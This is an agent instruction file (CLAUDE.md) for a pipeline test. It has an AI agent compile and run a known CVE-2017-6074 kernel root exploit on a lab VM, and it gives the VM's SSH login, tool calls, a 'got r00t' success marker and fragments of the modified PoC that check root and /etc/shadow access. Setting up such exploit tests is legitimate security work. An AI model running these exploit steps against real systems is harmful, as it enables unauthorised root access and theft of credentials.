# CLAUDE.md — CVE-2017-6074 Pipeline Test

## Mission

Test the MCP pipeline by compiling and running a known PoC exploit for CVE-2017-6074 on the target VM. The PoC source code is provided below — you do NOT need to write it from scratch.

## Target Environment

- **VM**: Ubuntu 16.04, kernel `4.4.0-62-generic`
- **SSH**: `host.docker.internal:2226`, user `ubuntu`, password `ubuntu`
...
### Step 1: Ensure VM is reachable
Call `vm_check_status()`. If the VM is not reachable, call `vm_start()` to start it (takes 1-3 minutes). Confirm kernel is `4.4.0-62-generic`.

### Step 2: Check VM environment
Run via `vm_execute()`:
```
uname -r && id
```
Confirm kernel `4.4.0-62-generic` and user `ubuntu`.

### Step 3: Compile the PoC (without running)
Use `vm_compile_and_run()` with the **full PoC source** below and `upload_only=True`:
```
vm_compile_and_run(source_code=POC_SOURCE, filename="poc.c", upload_only=True)
```
This uploads source to the VM and compiles with the VM's native gcc. Binary at `/home/ubuntu/poc`.

### Step 4: Run the PoC with automatic retries
```
vm_run_exploit(
    remote_binary="/home/ubuntu/poc",
    success_marker="got r00t",
...
**This single call handles everything**: runs the exploit, detects success/crash, restarts the VM on failure, and retries up to 5 times automatically. The exploit is semi-reliable (~50% success per attempt), so retries are expected.

**Do NOT manually retry, debug, or investigate.** Just call `vm_run_exploit` with `max_retries=5` and report the result.

### Step 5: Report results
Report the result from `vm_run_exploit`. Include: which attempt succeeded (or that all failed), and the exploit output.

---

## Full PoC Source (poc.c)

Compile with `vm_compile_and_run(source_code=POC_SOURCE, filename="poc.c", upload_only=True)`, then run with `vm_run_exploit(remote_binary="/home/ubuntu/poc")`:

**This version is modified for non-interactive SSH execution** — it runs `id` and checks `/etc/shadow` access instead of spawning an interactive shell, then sleeps to keep the process alive (killing it would crash the kernel).
...
//
// Modified for non-interactive execution (prints id instead of spawning shell).
//
...
bool is_root() {
	// We can't simply check uid, since we're running inside a namespace
...
void check_root() {
	...
	if (!is_root()) {
		...
		// Non-interactive: print proof and stay alive
		fflush(stdout);
		system("id");
...
int main() {
	...
	// Keep process alive — killing it crashes the kernel
	while (1) {
		sleep(100);
	}
...
`vm_run_exploit` with `max_retries > 1` handles crashes automatically — it restarts the VM and retries. You do NOT need to call `vm_restart()` manually when using `max_retries`.
